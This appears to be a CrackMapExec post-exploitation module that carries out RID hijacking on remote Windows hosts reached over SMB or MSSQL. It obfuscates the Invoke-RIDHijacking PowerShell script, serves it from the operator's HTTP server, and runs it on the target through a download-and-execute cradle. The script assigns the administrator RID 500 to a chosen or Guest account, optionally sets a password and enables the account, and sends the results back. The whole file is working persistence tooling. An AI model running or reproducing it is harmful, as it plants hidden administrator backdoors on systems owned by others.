from cme.helpers.powershell import *
from cme.helpers.logger import write_log, highlight
from datetime import datetime
from io import StringIO
import re

class CMEModule:
    '''
        Executes Invoke-RIDhijacking.ps1 allowing to set desired privileges to an existent local account by modifying the Relative Identifier value copy used to create the access token
        Module by Sebastian Castro @r4wd3r
    '''

    name = 'rid_hijack'
    description = "Executes the RID hijacking persistence hook."
    supported_protocols = ['smb', 'mssql']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
            RID             RID to set to the specified account. Default 500.
            USER            User to set the defined RID.
            USEGUEST        Boolean. Set the defined RID to the Guest account.
            PASSWORD        Password to set to the defined account.
            ENABLE          Boolean. Enable the defined account.
        '''

        self.rid = 500
        self.user = None
        self.password = None
        self.useguest = False
        self.enable = False
        
        if 'RID' in module_options:
            self.rid = int(module_options['RID'])
        if 'USER' in module_options:
            self.user = str(module_options['USER'])
        if 'PASSWORD' in module_options:
            self.password = str(module_options['PASSWORD'])
        if 'USEGUEST' in module_options:
            self.useguest = True
        if 'ENABLE' in module_options:
            self.enable = True

        self.ps_script1 = obfs_ps_script('RID-Hijacking/Invoke-RIDHijacking.ps1')

    def on_admin_login(self, context, connection):
        command = 'Invoke-RIDHijacking'
        command += ' -RID ' + str(self.rid)
        if self.user:
            command += ' -User ' + self.user
        if self.password:
            command += ' -Password ' + self.password
        if self.useguest:
            command += ' -UseGuest '
        if self.enable:
            command += ' -Enable '

        launcher = gen_ps_iex_cradle(context, 'Invoke-RIDHijacking.ps1', command)
        connection.ps_execute(launcher)
        context.log.success('Executed launcher')

    def on_request(self, context, request):
        if 'Invoke-RIDHijacking.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.wfile.write(self.ps_script1)

        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.getheader('content-length'))
        data = response.rfile.read(length)

        response.stop_tracking_host()

        if len(data):
            context.log.success('Invoke-RIDHijacking executed successfully')
            buf = StringIO(data.strip()).readlines()

            for line in buf:
                output = filter(None, re.split(r'(?:\s*\[.\]\s)', line.strip()))
                for o in output:
                    context.log.highlight(o)
